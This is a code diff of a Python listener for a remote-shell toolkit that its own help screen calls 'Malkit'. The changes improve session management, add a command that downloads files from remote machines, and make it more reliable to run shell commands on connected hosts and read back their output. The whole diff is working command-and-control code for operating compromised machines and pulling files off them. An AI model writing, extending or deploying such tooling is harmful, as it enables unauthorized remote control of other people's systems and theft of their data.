@@ -4,7 +4,6 @@ import sys
 import time
 import asyncio
 import threading
-
 from threading import Thread
 from progress.bar import Bar, PixelBar
 from progress.spinner import Spinner
@@ -14,22 +13,34 @@ alive = True
 
 
 def transfer(conn, command):
-    conn.send(command.encode())
-    grab, src, dst = command.split("::")
-    f = open(dst, 'wb')
-    while True:
-        bits = conn.recv(1024)
-        if bits.endswith('DONE'.encode()):
-            f.write(bits[:-4])
-            f.close()
-            print('[+] Transfer completed ')
-            break
-        if 'File not found'.encode() in bits:
-            print('[-] Unable to find out the file')
-            break
-        f.write(bits)
-    f.close()
-
+    try:
+        conn.send(command.encode())
+        grab, src, dst = command.split("::")
+        dst_directory = '/'.join(dst.replace("\\", "/").split("/")[:-1])
+        print(dst_directory)
+        if not dst_directory.endswith("/"):
+            dst_directory += "/"
+        if not os.path.exists(dst_directory):
+            os.makedirs(dst_directory)
+        transfer = True
+        bits = b""
+        while True:
+            print("Transferring file...", end="\r")
+            bits += conn.recv(1024)
+            if bits.startswith(b"File not found"):
+                print('[-] Unable to find out the file')
+                break
+            elif bits.endswith(b"DONE"):
+                bits = bits[:-4]
+                break
+        with open(dst, "wb") as f:
+            f.write(bits)
+            print(f"File written Successfully at: {dst}")
+            return 0
+    except Exception as e:
+        print(f"Unknown Exception: {e}")
+        return 1
+    
 
 def die():
     global alive
@@ -63,7 +74,32 @@ def run_server():
         except Exception as err:
             print(err)
 
+def help():
+    help_screen = """
+Malkit Listener Help Screen!
 
+The commands are split into two categories:
+    [Listener commands]: the ones you can use inside the "Listener>" screen.
+
+    [Shell commands]: the ones you can use inside the "Shell>" screen after interacting with a session.
+
+[Listener Commands]
+list    -   lists all active sessions in the format: SessionNumber: IP/PORT
+interact::SessionNumber    -   Allows you to interact with a session number. Example: interact::0
+kill::SessionNumber    -   Kills a specific session number. Example: kill::0
+exit    -   Exits the listener, same effect as a KeyboardInterrupt
+help    -   Shows this screen 
+
+
+[Shell Commands]
+<bg or <background  -   Backgrounds the current session, allowing you to return to the lister.
+<download::RemotePath::LocalPath    -   Downloads a file from the remote system into your local one.
+                                        Example: <download::remote_file.txt::savehere/files/downloaded.txt 
+exit or <exit   -   Kills the current shell, returning you into the listener
+
+"""
+    print(help_screen)
+    return 0
 def handle_client():
     BACKGROUND = ['background', 'bg']
     global alive
@@ -74,27 +110,31 @@ def handle_client():
             com, *arg = input(f"Listener> ").split(" ")
             com = com.lower()
             arg = ''.join(arg).lower()
-            if com == "cls" or com == "clear":
+            if com == "cls" or com == "clear" or com.encode() == b'\x0c':
                 try:
                     os.system("cls")
                 except:
                     os.system("clear")
-            if com == "exit":
+            elif com.lower() == "help":
+                help()
+                continue
+            elif com == "exit":
                 raise KeyboardInterrupt
-            if com == "list":
+            elif com == "list":
+                if len(sessions) == 0:
+                    print("No sessions at the moment")
+                    continue
                 for x in sessions:
                     print(f"{x[0]}: {x[2]}")
-            if com == "close":
-                break
-            if com == "kill":
+            elif com == "kill":
                 try:
                     int_arg = int(arg)
                     sessions.pop(int_arg)
                 except Exception as e:
                     print("error", e)
-            if 'interact' in com:
-                comm, snum = com.split("::")
+            elif com.startswith("interact"):
                 try:
+                    comm, snum = com.split("::")
                     conn = sessions[int(snum)][1]
                 except:
                     print("make sure you did it right")
@@ -104,8 +144,8 @@ def handle_client():
                         command = input(f"[{snum}] Shell>")
                         if command.startswith("exit") or command.startswith("<exit"):
                             sessions.pop(int(snum))
-                            raise KeyboardInterrupt
-                        elif command == 'cls' or command == 'clear':
+                            break
+                        elif command == 'cls' or command == 'clear' or command.encode() == b'\x0c':
                             try:
                                 os.system("cls")
                             except:
@@ -114,27 +154,50 @@ def handle_client():
                         elif command == "<bg" or command == "<background" or command == "exit":
                             print(f"Backgrounded: {snum}")
                             break
-                        elif '<download' in command:
-                            transfer(conn, command)
+                        elif command.startswith('<download'):
+                            try:
+                                grab, src, dst = command.split("::")
+                                transfer(conn, command)
+                            except Exception as e:
+                                print("Hey, use proper syntax. Example: <download::remotefile::localdestination/localfile.txt")
+                            continue
+                            
                         elif command.strip() == "":
                             continue
-                        elif 'cd ' in command[:2]:
+                        elif command.startswith("cd "):
                             conn.send(command.encode())
-                            print("sent")
+                            output = b""
+                            while True:
+                                output += conn.recv(1024)
+                                if output.endswith(b"CDDONE"):
+                                    print(output.decode().replace("CDDONE", ""))
+                                    break
+                            continue
+                        elif command.lower() == "help":
+                            help()
                             continue
                         else:
                             conn.send(command.encode())
-                            print(conn.recv(2048).decode())
+                            output = b""
+                            while True:
+                                output += conn.recv(1024)
+                                if output.endswith(b"CMDDONE"):
+                                    print(output.decode().replace("CMDDONE", ""))
+                                    break                                
                     except WindowsError:
                         break
+                    except (KeyboardInterrupt, EOFError):
+                        print("")
+                        continue
                     except Exception as err:
-                        print(f"Inside Error: [{err}]")
+                        print(f"Shell Error: [{err}]")
+                        continue
         except (KeyboardInterrupt, EOFError):
             break
     die()
 
 
-
+## Need to add detection of timed out connection!
 
 #def timeout():
 #    global sessions
